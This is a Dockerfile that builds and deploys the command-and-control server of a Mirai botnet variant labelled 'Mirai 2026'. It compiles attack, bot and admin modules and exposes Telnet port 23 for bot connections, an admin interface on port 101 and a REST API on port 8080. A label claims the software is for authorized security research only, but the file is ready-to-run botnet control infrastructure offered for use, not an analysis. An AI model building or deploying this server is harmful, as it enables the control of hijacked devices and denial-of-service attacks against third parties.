# Stage 1: Builder
FROM golang:1.21-alpine AS builder

# Install build dependencies
RUN apk add --no-cache \
    git \
    ca-certificates \
    build-base

# Set working directory
WORKDIR /build

# Copy go.mod and go.sum first for better layer caching
COPY mirai/cnc/go.mod .
COPY mirai/cnc/go.sum .

# Download dependencies
RUN go mod download && \
    go mod verify

# Copy only the necessary source files (excluding cnc_modern.go and cnc_optimized.go which have duplicate mains)
COPY mirai/cnc/main.go .
COPY mirai/cnc/admin.go .
COPY mirai/cnc/api.go .
COPY mirai/cnc/attack.go .
COPY mirai/cnc/bot.go .
COPY mirai/cnc/clientList.go .
COPY mirai/cnc/constants.go .
COPY mirai/cnc/database.go .

# Build the CNC server with optimizations
RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build \
    -ldflags='-w -s -X main.version=2.0.0' \
    -o cnc_server \
    .

# Verify the binary was created
RUN ls -lh cnc_server && file cnc_server


# Stage 2: Runtime
FROM alpine:3.19

# Install runtime dependencies
RUN apk add --no-cache \
    ca-certificates \
    libsodium \
    tzdata \
    wget

# Create non-root user
RUN addgroup -S mirai && \
    adduser -S -G mirai mirai

# Set working directory
WORKDIR /app

# Copy binary from builder
COPY --from=builder /build/cnc_server /app/cnc_server

# Copy database initialization script (if present in the repo)
# Note: init-db.sql is optional and may not exist
RUN if [ -f mirai/cnc/init-db.sql ]; then cp mirai/cnc/init-db.sql /app/init-db.sql; fi

# Set executable permissions
RUN chmod +x /app/cnc_server

# Change ownership to non-root user
RUN chown -R mirai:mirai /app

# Expose ports
# 23 - Telnet (bot connections)
# 101 - Admin interface
# 8080 - REST API
EXPOSE 23 101 8080

# Environment defaults
ENV DB_HOST=postgres
ENV DB_PORT=5432
ENV DB_NAME=mirai
ENV DB_USER=mirai
ENV DB_PASSWORD=
ENV BOT_CHALLENGE_SECRET=
ENV JWT_SECRET=
ENV LOG_LEVEL=info

# Convert environment variables to CNC-compatible format (if needed)
ENV DATABASE_ADDR=postgres
ENV DATABASE_USER=mirai
ENV DATABASE_PASS=
ENV DATABASE_TABLE=mirai

# Health check
HEALTHCHECK --interval=30s --timeout=3s --start-period=10s --retries=3 \
    CMD wget -qO- http://localhost:8080/api/health || exit 1

# Switch to non-root user
USER mirai

# Metadata labels
LABEL org.opencontainers.image.title="Mirai 2026 CNC Server"
LABEL org.opencontainers.image.description="Command and Control server for Mirai 2026 - Go-based with REST API, WebSocket, and Telnet interfaces"
LABEL org.opencontainers.image.version="2.0.0"
LABEL org.opencontainers.image.authors="Mirai 2026 Project"
LABEL org.opencontainers.image.source="https://github.com/mirai-2026/cnc"
LABEL org.opencontainers.image.documentation="https://docs.example.com/cnc"
LABEL security.ethical-use="This software is intended for authorized security research and educational purposes only"

# Entry point
ENTRYPOINT ["/app/cnc_server"]
